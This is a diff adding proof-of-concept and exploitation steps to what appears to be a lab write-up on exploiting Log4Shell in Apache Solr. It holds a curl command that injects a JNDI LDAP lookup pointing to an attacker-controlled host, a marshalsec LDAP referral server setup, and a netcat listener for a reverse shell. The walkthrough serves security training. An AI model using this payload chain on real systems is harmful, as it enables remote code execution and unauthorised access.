@@ -35,4 +35,54 @@ FINDING SOLR.LOG WE SEE MANY REQUESTS BUT NOT PARAMETER ARE NOT PASSED SO USER C
 
 Answer:params
 # Proof Of Concept
+FIRST know your ip.
+
+using ip a
+
+nc -lvnp 9999
+<img width="1920" height="936" alt="Screenshot_2026-03-22_11_26_20" src="https://github.com/user-attachments/assets/a9419627-f7c1-4563-b24e-fdea63b096bc" />
+OPEN ANOTHER TERMINAL 
+
+curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'
+
+<img width="1920" height="936" alt="Screenshot_2026-03-22_11_26_20" src="https://github.com/user-attachments/assets/fd656970-7b42-48f0-8bd9-8fdf6605b162" />
+ITS GET REPONSE IN (nc -lvnp 9999)THE CONNECTION IS WORKING,THEN EXPLOIT
+# Exploitation
+**I HAVE DONE IN MY MACHINE NOT IN THE ATTACK BOX.**
+
+THEY ALSO PROVIDE INSTRUCTION TO FOLLOW THE WITHOUT ATTACK BOX 
+
+obtaining the LDAP Referral Server which already in git 
+
+Initially *command : git clone  https://github.com/mbechler/marshalsec*
+
+*Start LDAP server*
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://192.168.188.160:8000/#Exploit
+
+<img width="1920" height="936" alt="image" src="https://github.com/user-attachments/assets/b7ed25bd-8ea9-4363-8962-77be57687087" />
+
+Answer:listing on 0.0.0.0:1389
+
+*start Exploit java*
+
+CREATE THE JAVA FILE AND RUN  IT 
+
+*IMP SAME FOLDER RUN PYTHON *
+
+<img width="1920" height="936" alt="image" src="https://github.com/user-attachments/assets/ae7619e0-5f50-4939-9d7a-c474ef74c913" />
+*Start netcat*
+nc -lvnp 9999
+**Execute the code**
+           # curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
+           
+ <img width="1920" height="936" alt="Screenshot_2026-03-22_15_18_57" src="https://github.com/user-attachments/assets/e3f60caf-99ce-4e0b-b7cd-5debda46e89c" />
+**finally**
+
+we get access
+
+<img width="964" height="178" alt="image" src="https://github.com/user-attachments/assets/7ab59db3-70fa-47f7-b5b8-44b2a80e38a0" />
+#
+
+
+
 
